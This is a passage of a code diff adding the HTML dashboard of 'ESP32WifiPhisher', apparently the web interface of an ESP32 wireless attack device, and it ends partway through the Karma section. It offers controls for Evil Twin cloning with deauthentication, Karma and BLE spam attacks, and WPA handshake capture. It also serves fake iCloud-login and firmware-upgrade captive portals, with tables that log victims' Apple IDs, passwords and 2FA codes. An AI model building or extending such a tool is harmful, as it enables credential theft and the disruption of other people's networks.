@@ -1,0 +1,3349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#f4f4f6">
+    <title>ESP32WifiPhisher</title>
+    <link rel="stylesheet" href="app.css">
+</head>
+<body>
+<script src="theme.js"></script>
+
+<div class="app">
+    <!-- ============ SIDEBAR ============ -->
+    <aside class="sidebar" id="sidebar">
+        <div class="side-brand">
+            <span class="logo">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            </span>
+            <span data-i18n="dashboard_title">ESP32 AUDIT</span>
+        </div>
+        <nav class="side-nav" id="side-nav">
+            <div class="cat" data-i18n="dashboard_cat">Dashboard</div>
+            <button class="nav-item active" data-view="view-home" onclick="showView('view-home', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span data-i18n="status_overview">Status Overview</span>
+            </button>
+
+            <div class="cat" data-i18n="wifi_modules_cat">WiFi Modules</div>
+            <button class="nav-item" data-view="view-sniffer" onclick="showView('view-sniffer', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93z"/></svg>
+                <span data-i18n="packet_analyzer">Packet Analyzer</span>
+            </button>
+            <button class="nav-item" data-view="view-scan" onclick="showView('view-scan', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12.01 21.49L23.64 7c-.45-.34-4.93-4-11.64-4C5.28 3 .81 6.66.36 7l11.63 14.49z"/></svg>
+                <span data-i18n="scanner_sniff">Scanner &amp; Sniff</span>
+            </button>
+            <button class="nav-item" data-view="view-recon" onclick="showView('view-recon', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM4 12c0-4.42 3.58-8 8-8 1.85 0 3.55.63 4.9 1.69L5.69 16.9C4.63 15.55 4 13.85 4 12z"/></svg>
+                <span data-i18n="recon_airodump">Recon (Airodump)</span>
+            </button>
+            <button class="nav-item" data-view="view-eviltwin" onclick="showView('view-eviltwin', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                <span data-i18n="eviltwin_attack">Evil Twin Attack</span>
+            </button>
+            <button class="nav-item" data-view="view-karma" onclick="showView('view-karma', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93z"/></svg>
+                <span data-i18n="karma_attack">Karma Attack</span>
+            </button>
+            <button class="nav-item" data-view="view-deauth" onclick="showView('view-deauth', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM4 12c0-4.42 3.58-8 8-8 1.85 0 3.55.63 4.9 1.69L5.69 16.9C4.63 15.55 4 13.85 4 12zm8 8c-1.85 0-3.55-.63-4.9-1.69L18.31 7.1C19.37 8.45 20 10.15 20 12c0 4.42-3.58 8-8 8z"/></svg>
+                <span data-i18n="deauth_attack">Deauther</span>
+            </button>
+
+            <div class="cat" data-i18n="ble_cat">Bluetooth Modules</div>
+            <button class="nav-item" data-view="view-ble" onclick="showView('view-ble', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M17.71 7.71L12 2h-1v7.59L6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 11 14.41V22h1l5.71-5.71-4.3-4.29 4.3-4.29z"/></svg>
+                <span data-i18n="ble_sniffer">BLE Sniffer</span>
+            </button>
+            <button class="nav-item" data-view="view-ble-spam" onclick="showView('view-ble-spam', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M11 2v4.26L6.53 1.74 5.11 3.15l15.73 15.74 1.41-1.42-4.14-4.14L22 9h-4.27L22 4.74l-1.41-1.41L13 11.2V2h-2z"/></svg>
+                <span data-i18n="ble_spam">BLE Spam Attack</span>
+            </button>
+
+            <div class="cat" data-i18n="net_cat">Network Analysis</div>
+            <button class="nav-item" data-view="view-sta" id="menu-sta" onclick="showView('view-sta', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 21L15.6 16.2C14.6 15.45 13.35 15 12 15s-2.6.45-3.6 1.2L12 21zM12 3C7.95 3 4.21 4.34 1.2 6.6L3 9c2.5-1.88 5.62-3 9-3s6.5 1.12 9 3l1.8-2.4C19.79 4.34 16.05 3 12 3z"/></svg>
+                <span data-i18n="sta_connection">Target Connection</span>
+            </button>
+            <button class="nav-item" data-view="view-host-discovery" id="menu-host-discovery" onclick="showView('view-host-discovery', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 11c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 3-1.34 3-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5C15 14.17 10.33 13 8 13zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+                <span data-i18n="host_discovery">Host Discovery</span>
+            </button>
+            <button class="nav-item" data-view="view-port-scan" id="menu-port-scan" onclick="showView('view-port-scan', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 3H5a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2V5a2 2 0 00-2-2zm-7 9h-2V7H8v5H6v-2H4v6h8v-4z"/></svg>
+                <span data-i18n="port_scanner">Port Scanner</span>
+            </button>
+
+            <div class="cat" data-i18n="system_cat">System</div>
+            <button class="nav-item" data-view="view-handshakes" onclick="showView('view-handshakes', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-6 9a2 2 0 110-4 2 2 0 010 4zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
+                <span data-i18n="captured_handshakes">Captured Handshake</span>
+            </button>
+            <button class="nav-item" data-view="view-passwords" onclick="showView('view-passwords', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12.65 10A5.99 5.99 0 007 6a6 6 0 000 12 5.99 5.99 0 005.65-4H17v4h4v-4h2v-4H12.65zM7 14a2 2 0 110-4 2 2 0 010 4z"/></svg>
+                <span data-i18n="captured_creds">Captured Creds</span>
+            </button>
+            <a class="nav-item" href="flasher.html" target="_blank" rel="noopener" style="text-decoration:none;">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 2v2H5a2 2 0 00-2 2v14h2V6h12v14h2V6a2 2 0 00-2-2h-2V2h-2v2H9V2H7zm0 8h10v2H7v-2zm0 4h10v2H7v-2z"/></svg>
+                <span data-i18n="flasher_title">Firmware Flasher</span>
+            </a>
+            <button class="nav-item" data-view="view-settings" onclick="showView('view-settings', this)">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.07-.94l2.03-1.58a.5.5 0 00.12-.61l-1.92-3.32a.5.5 0 00-.59-.22l-2.39.96a7.3 7.3 0 00-1.62-.94l-.36-2.54a.5.5 0 00-.48-.41h-3.84a.5.5 0 00-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96a.5.5 0 00-.59.22L2.74 8.87a.5.5 0 00.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.5.5 0 00-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.58 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32a.5.5 0 00-.12-.61l-2.01-1.58zM12 15.6A3.6 3.6 0 1112 8.4a3.6 3.6 0 010 7.2z"/></svg>
+                <span data-i18n="configuration">Configuration</span>
+            </button>
+        </nav>
+        <div class="side-foot">
+            <button type="button" class="side-status" id="side-status">
+                <i class="dot"></i><span id="side-status-text">Offline</span>
+            </button>
+        </div>
+    </aside>
+
+    <!-- ============ MAIN ============ -->
+    <div class="main">
+        <header class="top">
+            <button class="icon-btn" id="nav-toggle" onclick="toggleSidebar()" aria-label="Menu">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+            </button>
+            <div class="title" id="page-title" data-i18n="status_overview">Status Overview</div>
+            <div class="spacer"></div>
+
+            <div class="status-indicators" style="display:flex;align-items:center;gap:10px;">
+                <select id="lang-select" class="lang-select" onchange="changeLanguage(this.value)">
+                    <option value="zh">中文</option>
+                    <option value="en">EN</option>
+                </select>
+                <div class="chip"><span class="k" data-i18n="uptime">UPTIME</span><span class="v" id="uptime-val">--:--:--</span></div>
+                <div class="ram">
+                    <div class="lbl"><span data-i18n="ram">RAM</span><span id="ram-text-val">0%</span></div>
+                    <div class="track"><div class="fill" id="ram-bar"></div></div>
+                </div>
+                <a class="icon-btn" href="flasher.html" target="_blank" rel="noopener" title="Web Flasher (ESP Web Tools)" style="text-decoration:none;">
+                    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 2v2H5a2 2 0 00-2 2v14h2V6h12v14h2V6a2 2 0 00-2-2h-2V2h-2v2H9V2H7zm0 8h10v2H7v-2zm0 4h10v2H7v-2z"/></svg>
+                </a>
+                <button class="icon-btn" id="theme-toggle" onclick="toggleTheme()" aria-label="Theme" title="Theme">
+                    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3a9 9 0 109 9 7 7 0 01-9-9z"/></svg>
+                </button>
+                <div class="chip accent" id="badge-usb" style="display:none;">USB WIFI</div>
+            </div>
+        </header>
+
+        <!-- mobile horizontal tabs (mirrors .nav-item) -->
+        <nav class="mobile-nav" id="mobile-nav"></nav>
+
+        <div class="view active" id="view-home">
+            <h2 data-i18n="dashboard_title">Dashboard</h2>
+
+            <div class="grid c3" style="margin-bottom:12px;">
+                <div class="card" id="mod-et">
+                    <div class="section-label" data-i18n="mod_et">EVIL TWIN</div>
+                    <div class="mod-status" style="font-weight:600;color:var(--faint);" data-i18n="status_inactive">INACTIVE</div>
+                </div>
+                <div class="card" id="mod-deauth">
+                    <div class="section-label" data-i18n="mod_deauth">DEAUTHER</div>
+                    <div class="mod-status" style="font-weight:600;color:var(--faint);" data-i18n="status_inactive">INACTIVE</div>
+                </div>
+                <div class="card" id="mod-karma">
+                    <div class="section-label" data-i18n="mod_karma">KARMA</div>
+                    <div class="mod-status" style="font-weight:600;color:var(--faint);" data-i18n="status_inactive">INACTIVE</div>
+                </div>
+            </div>
+
+            <div class="grid c2" style="margin-bottom:12px;">
+                <div class="card">
+                    <div class="card-head"><span class="grow" data-i18n="primary_target_info">PRIMARY TARGET INFO</span><span class="chip" id="global-status-badge"><span data-i18n="system_idle">SYSTEM IDLE</span></span></div>
+                    <div class="card-body">
+                        <div style="display:flex;justify-content:space-between;align-items:baseline;gap:10px;">
+                            <div id="home-ssid" class="strong" style="font-size:17px;font-weight:650;overflow-wrap:anywhere;" data-i18n="no_target">No Target</div>
+                            <div id="home-rssi" class="mono" style="color:var(--muted);white-space:nowrap;">-- dBm</div>
+                        </div>
+                        <dl class="kv" style="margin-top:12px;">
+                            <dt data-i18n="mac_address">MAC</dt><dd id="home-bssid" class="mono">--:--:--:--:--:--</dd>
+                            <dt data-i18n="vendor">VENDOR</dt><dd id="home-vendor">--</dd>
+                            <dt data-i18n="channel">CHANNEL</dt><dd id="home-ch" class="mono" style="color:var(--accent);font-weight:600;">--</dd>
+                            <dt data-i18n="security">SECURITY</dt><dd id="home-auth">--</dd>
+                        </dl>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-head"><span class="grow" data-i18n="intel_capture">INTELLIGENCE &amp; CAPTURE</span></div>
+                    <div class="card-body">
+                        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--line-2);">
+                            <div>
+                                <div style="font-weight:600;color:var(--fg);" data-i18n="wpa_handshake">WPA Handshake</div>
+                                <div style="font-size:11px;color:var(--muted);" data-i18n="hash_collection">Hash collection</div>
+                            </div>
+                            <span class="badge" id="home-hs-badge" data-i18n="status_waiting">WAITING</span>
+                        </div>
+                        <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--line-2);">
+                            <div>
+                                <div style="font-weight:600;color:var(--fg);" data-i18n="5ghz_twin">5GHz Twin</div>
+                                <div style="font-size:11px;color:var(--muted);" data-i18n="dual_band_detection">Dual-band AP detection</div>
+                            </div>
+                            <span class="badge" id="home-5g-badge" data-i18n="status_scanning">SCANNING</span>
+                        </div>
+                        <div class="grid c2" style="margin-top:12px;">
+                            <div class="kpi"><div class="num" id="home-clients">0</div><div class="cap" data-i18n="clients">CLIENTS</div></div>
+                            <div class="kpi"><div class="num" id="home-aps">0</div><div class="cap" data-i18n="networks">NETWORKS</div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-head"><span class="grow" data-i18n="packet_injection_health">PACKET INJECTION HEALTH</span></div>
+                    <div class="card-body">
+                        <div class="grid c3" style="margin-bottom:12px;">
+                            <div class="kpi"><div class="num" id="stat-tx-sent">0</div><div class="cap" data-i18n="sent">SENT</div></div>
+                            <div class="kpi"><div class="num" id="stat-tx-drop" style="color:var(--red);">0</div><div class="cap" data-i18n="dropped">DROPPED</div></div>
+                            <div class="kpi"><div class="num" id="stat-tx-pps" style="color:var(--accent);">0</div><div class="cap" data-i18n="pps">PPS</div></div>
+                        </div>
+                        <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--muted);margin-bottom:5px;">
+                            <span data-i18n="injection_quality">INJECTION QUALITY</span>
+                            <span id="stat-quality-perc">IDLE</span>
+                        </div>
+                        <div class="ram" style="width:100%;">
+                            <div class="track"><div class="fill" id="stat-quality-bar"></div></div>
+                        </div>
+                        <div id="stat-message" style="margin-top:8px;font-size:11.5px;color:var(--muted);">—</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-head"><span class="grow">STA CONNECTION</span><span class="badge" id="dash-sta-badge" data-i18n="status_inactive">DISCONNECTED</span></div>
+                    <div class="card-body">
+                        <dl class="kv">
+                            <dt data-i18n="networks">SSID</dt><dd id="dash-sta-ssid" style="overflow-wrap:anywhere;">—</dd>
+                            <dt data-i18n="mgmt_ap_ssid">IP</dt><dd id="dash-sta-ip" class="mono">--.--.--.--</dd>
+                            <dt data-i18n="th_destination">GW</dt><dd id="dash-sta-gw" class="mono">--.--.--.--</dd>
+                            <dt data-i18n="th_subtype">MASK</dt><dd id="dash-sta-mask" class="mono">--.--.--.--</dd>
+                        </dl>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-sniffer">
+            <h2 data-i18n="live_packet_analyzer">Live Packet Analyzer</h2>
+            <div class="card" style="margin-bottom:12px;">
+                <div class="section-label" data-i18n="capture_configuration">CAPTURE CONFIGURATION</div>
+                <div class="grid auto">
+                    <div>
+                        <label data-i18n="frequency">Frequency</label>
+                        <div class="row" style="flex-wrap:nowrap;">
+                            <select id="sniff-chan" style="flex:1;"></select>
+                            <label class="check" style="margin:0;white-space:nowrap;"><input type="checkbox" id="sniff-hop"><span data-i18n="hop">HOP</span></label>
+                        </div>
+                    </div>
+                    <div>
+                        <label data-i18n="main_frame_type">Main Frame Type</label>
+                        <select id="sniff-type" onchange="updateSubtypes()">
+                            <option value="0" data-i18n="opt_all_traffic">ALL TRAFFIC</option>
+                            <option value="1" data-i18n="opt_mgmt">MANAGEMENT</option>
+                            <option value="2" data-i18n="opt_ctrl">CONTROL</option>
+                            <option value="3" data-i18n="opt_data">DATA</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label data-i18n="subtype_filter">Subtype Filter</label>
+                        <select id="sniff-subtype" disabled><option value="0" data-i18n="opt_all_subtypes">All Subtypes</option></select>
+                    </div>
+                </div>
+
+                <div class="section-label" style="margin-top:14px;" data-i18n="display_filters">DISPLAY FILTERS</div>
+                <div class="grid auto">
+                    <input type="text" id="disp-filter-src" data-i18n="ph_source_mac" placeholder="Source MAC">
+                    <input type="text" id="disp-filter-dst" data-i18n="ph_dest_mac" placeholder="Dest MAC">
+                    <input type="text" id="disp-filter-ssid" data-i18n="ph_ssid_info" placeholder="SSID / Info">
+                    <input type="number" id="disp-filter-rssi" placeholder="Min RSSI (-90)" value="-95">
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn" onclick="startCapture()" id="btn-sniff-start"><span data-i18n="btn_start">START</span></button>
+                    <button class="btn danger" onclick="stopCapture()" id="btn-sniff-stop" disabled><span data-i18n="btn_stop">STOP</span></button>
+                    <button class="btn secondary" onclick="togglePause()" id="btn-sniff-pause" data-i18n="btn_pause_view">PAUSE VIEW</button>
+                    <button class="btn secondary" onclick="clearSnifferTable()" data-i18n="btn_clear">CLEAR</button>
+                </div>
+                <div style="margin-top:8px;font-size:11.5px;color:var(--muted);text-align:right;">
+                    <span data-i18n="rx_count">Rx:</span> <span id="pkt-total-count">0</span> &nbsp; <span data-i18n="shown_count">Shown:</span> <span id="pkt-display-count">0</span>
+                </div>
+            </div>
+
+            <div class="card flush">
+                <div class="table-wrap" style="max-height:520px;overflow-y:auto;">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_ch">Ch</th>
+                            <th data-i18n="th_dbm">dBm</th>
+                            <th data-i18n="th_type">Type</th>
+                            <th data-i18n="th_subtype">Subtype</th>
+                            <th data-i18n="th_source">Source</th>
+                            <th data-i18n="th_destination">Destination</th>
+                            <th data-i18n="th_len">Len</th>
+                            <th data-i18n="th_info">Info</th>
+                        </tr></thead>
+                        <tbody id="sniffer-body"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-scan">
+            <h2 data-i18n="wifi_scanner_title">WiFi Scanner</h2>
+            <div class="card" style="margin-bottom:12px;">
+                <p style="margin:0 0 12px;color:var(--muted);font-size:12px;" data-i18n="scan_desc">Scan for nearby Access Points to select a target.</p>
+                <div class="warn" style="margin:0 0 12px;" data-i18n="scan_hint">
+                    Scanning moves the radio off the access-point channel: connected clients drop for a second or two and the dashboard reconnects by itself.
+                </div>
+                <button class="btn" onclick="scanNetworks()" data-i18n="btn_start_scan">Start Scan</button>
+            </div>
+            <div id="network-list" class="card flush">
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_ssid">SSID</th>
+                            <th data-i18n="th_rssi">RSSI</th>
+                            <th data-i18n="th_ch">CH</th>
+                            <th data-i18n="th_bssid">BSSID</th>
+                            <th data-i18n="th_sec">Sec</th>
+                            <th data-i18n="th_wps">WPS</th>
+                            <th data-i18n="th_action">Action</th>
+                        </tr></thead>
+                        <tbody id="wifi-networks-body">
+                            <tr class="empty"><td colspan="7" data-i18n="no_scan_data">No scan data</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-recon">
+            <h2 data-i18n="recon_title">Network Reconnaissance</h2>
+            <div class="card" style="margin-bottom:12px;">
+                <div class="row" style="align-items:flex-end;">
+                    <div style="flex:0 1 150px;">
+                        <label style="margin-top:0;" data-i18n="channel">CH</label>
+                        <select id="recon-chan"><option value="0">ALL (HOP)</option></select>
+                    </div>
+                    <div class="btn-group" style="margin-top:0;flex:1 1 auto;">
+                        <button class="btn" onclick="startRecon()" id="btn-recon-start">START</button>
+                        <button class="btn danger" onclick="stopRecon()" id="btn-recon-stop" disabled>STOP</button>
+                        <button class="btn secondary" onclick="clearReconData()" data-i18n="btn_clear">CLEAR</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card flush" style="margin-bottom:12px;">
+                <div class="card-head"><span class="grow" style="color:var(--accent);">ACCESS POINTS</span></div>
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_essid">ESSID</th>
+                            <th data-i18n="th_bssid">BSSID</th>
+                            <th data-i18n="th_pwr">PWR</th>
+                            <th data-i18n="th_ch">CH</th>
+                            <th data-i18n="th_pkts">FRAMES</th>
+                            <th data-i18n="th_clients">CLIENTS</th>
+                            <th data-i18n="th_bytes">BYTES</th>
+                            <th data-i18n="th_sec">ENC</th>
+                            <th data-i18n="th_hs">HS</th>
+                        </tr></thead>
+                        <tbody id="recon-ap-body"><tr class="empty"><td colspan="9">Start an attack or scan to listen...</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card flush">
+                <div class="card-head"><span class="grow" style="color:var(--accent);">CLIENTS</span></div>
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_station">STATION (MAC)</th>
+                            <th data-i18n="th_assoc_ap">AP (SSID)</th>
+                            <th data-i18n="th_ch">CH</th>
+                            <th data-i18n="th_pwr">PWR</th>
+                            <th data-i18n="th_probes">PROBES</th>
+                            <th data-i18n="th_pkts">FRAMES</th>
+                            <th data-i18n="th_bytes">BYTES</th>
+                        </tr></thead>
+                        <tbody id="recon-cli-body"><tr class="empty"><td colspan="7">No clients yet.</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-eviltwin">
+            <h2 data-i18n="evil_twin_title">Evil Twin Attack</h2>
+            <div class="card">
+                <label data-i18n="attack_scenario">ATTACK SCENARIO</label>
+                <select id="attack-scenario">
+                    <option value="0" data-i18n="opt_fw_upgrade">Firmware Upgrade</option>
+                    <option value="1" data-i18n="opt_fake_nm">Fake Network Manager</option>
+                    <option value="3" data-i18n="opt_oauth">OAuth Login</option>
+                    <option value="4" data-i18n="opt_icloud">iCloud Login</option>
+                </select>
+
+                <label style="margin-top:12px;" data-i18n="attack_mode">ATTACK MODE</label>
+                <select id="attack-mode">
+                    <option value="0" data-i18n="mode_deauth">Clone + Deauth (kick clients off real AP)</option>
+                    <option value="1" data-i18n="mode_clone">Clone Only (no deauth, just mirror the AP)</option>
+                </select>
+                <p id="pmf-warning" style="display:none;margin:10px 0 0;padding:8px 10px;border-radius:8px;background:rgba(255,171,64,.15);color:#ffab40;font-size:12px;" data-i18n="pmf_warning">
+                    Target uses WPA3/PMF: deauth frames are ignored by the client. Clone-only or CSA fallback may be the only option.
+                </p>
+
+                <div style="margin-top:16px;padding:12px;border-radius:var(--r-ctl);background:var(--accent-soft);">
+                    <div class="section-label" style="color:var(--accent);margin-bottom:4px;" data-i18n="target_details">TARGET DETAILS</div>
+                    <div id="current-target-ssid" style="font-size:15px;font-weight:650;color:var(--accent);overflow-wrap:anywhere;" data-i18n="no_target_selected">No Target Selected</div>
+                    <div id="current-target-bssid" class="mono" style="color:var(--muted);">--:--:--:--:--:--</div>
+                </div>
+
+                <div style="margin-top:12px;padding:12px;border-radius:var(--r-ctl);background:#232327;border:1px solid #333339;">
+                    <div class="section-label" style="color:var(--muted);margin-bottom:6px;" data-i18n="dashboard_access">DASHBOARD ACCESS</div>
+                    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+                        <span style="color:var(--muted);font-size:12px;">URL</span>
+                        <span id="admin-url" class="mono" style="font-weight:600;color:var(--accent);overflow-wrap:anywhere;">—</span>
+                        <span style="color:var(--muted);font-size:12px;margin-left:8px;">PIN</span>
+                        <span id="admin-pin" class="mono" style="font-weight:600;letter-spacing:2px;">—</span>
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn danger" onclick="startEvilTwin()" data-i18n="btn_launch_attack">LAUNCH ATTACK</button>
+                    <button class="btn secondary" onclick="stopEvilTwin()" data-i18n="btn_terminate">TERMINATE</button>
+                </div>
+            </div>
+
+            <div class="card flush" style="margin-top:12px;">
+                <div class="card-head">
+                    <span class="grow" data-i18n="saved_targets">SAVED TARGETS (OFFLINE CLONE)</span>
+                    <span class="badge" id="saved-count">0</span>
+                </div>
+                <div class="card-body">
+                    <p style="margin:0 0 10px;color:var(--muted);font-size:12px;" data-i18n="saved_hint">
+                        Save a scanned target to flash so you can clone and attack it later, even where that hotspot is not present.
+                    </p>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
+                        <input id="saved-name" placeholder="Name (optional)" style="flex:1;min-width:120px;" />
+                        <button class="btn" onclick="saveCurrentTarget()" data-i18n="btn_save_target">SAVE CURRENT</button>
+                        <button class="btn secondary" onclick="refreshSavedTargets()" data-i18n="btn_refresh_state">REFRESH</button>
+                    </div>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th data-i18n="th_name">NAME</th>
+                                <th>SSID</th>
+                                <th>CH</th>
+                                <th data-i18n="th_auth">AUTH</th>
+                                <th></th>
+                            </tr>
+                        </thead>
+                        <tbody id="saved-targets-body"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card" style="margin-top:12px;">
+                <div class="card-head">
+                    <span class="grow" data-i18n="portal_deliver">DELIVER PORTAL PAGE</span>
+                    <span class="badge" id="portal-current">—</span>
+                </div>
+                <div class="card-body">
+                    <p style="margin:0 0 12px;color:var(--muted);font-size:12px;" data-i18n="portal_hint">
+                        Choose which page connected clients receive on their next captive-portal request.
+                    </p>
+                    <label style="margin-top:0;" data-i18n="portal_page">PAGE SERVED TO CLIENTS</label>
+                    <select id="portal-page">
+                        <option value="0" data-i18n="opt_fw_upgrade">Firmware Upgrade</option>
+                        <option value="4" data-i18n="opt_icloud">iCloud Login</option>
+                        <option value="255" data-i18n="opt_portal_admin">Admin page (no phishing)</option>
+                        <option value="1" disabled>Fake Network Manager (page missing)</option>
+                        <option value="2" disabled>Plugin Update (page missing)</option>
+                        <option value="3" disabled>OAuth Login (page missing)</option>
+                    </select>
+                    <label class="check" style="margin-top:12px;">
+                        <input type="checkbox" id="portal-auto" onchange="setPortalAuto(this.checked)">
+                        <span data-i18n="portal_auto">Auto by device (Apple → iCloud, others → Firmware Upgrade)</span>
+                    </label>
+                    <div class="btn-group">
+                        <button class="btn" onclick="deliverPortal()" data-i18n="btn_deliver">DELIVER NOW</button>
+                        <button class="btn secondary" onclick="refreshPortalState()" data-i18n="btn_refresh_state">REFRESH</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card flush" style="margin-top:12px;">
+                <div class="card-head">
+                    <span class="grow" data-i18n="portal_ua_log">VISITOR DEVICES</span>
+                    <span class="badge" id="portal-ua-count">0</span>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_ua">User-Agent</th>
+                            <th data-i18n="th_served">Served</th>
+                            <th data-i18n="th_when">When</th>
+                        </tr></thead>
+                        <tbody id="portal-ua-body">
+                            <tr class="empty"><td colspan="3" data-i18n="portal_no_ua">No visitors yet.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="card flush" style="margin-top:12px;">
+                <div class="card-head">
+                    <span class="grow" data-i18n="portal_sessions">LOGIN ATTEMPTS</span>
+                    <span class="badge" id="portal-session-count">0</span>
+                </div>
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_session">#</th>
+                            <th data-i18n="th_email">Apple ID</th>
+                            <th data-i18n="th_password">Password</th>
+                            <th data-i18n="th_otp">2FA Code</th>
+                            <th data-i18n="th_state">State</th>
+                            <th data-i18n="th_action">Action</th>
+                        </tr></thead>
+                        <tbody id="portal-sessions-body">
+                            <tr class="empty"><td colspan="6" data-i18n="portal_no_sessions">No login attempts yet.</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-karma">
+            <h2 data-i18n="karma_probe_scanner">Karma Probe Scanner</h2>
+            <div class="card" style="margin-bottom:12px;">
+                <label data-i18n="phishing_scenario_lbl">PHISHING SCENARIO</label>
+                <select id="karma-scenario">
+                    <option value="0" data-i18n="opt_fw_upgrade">Firmware Upgrade</option>
+                    <option value="1" data-i18n="opt_fake_nm">Fake Network Manager</option>
+                    <option value="3" data-i18n="opt_oauth">OAuth Login</option>
+                    <option value="4" data-i18n="opt_icloud">iCloud Login</option>
+                </select>
+                <p style="margin:12px 0 0;color:var(--muted);font-size:12px;" data-i18n="scan_devices_lbl">Scan for devices probing for known networks.</p>
+                <div class="btn-group">
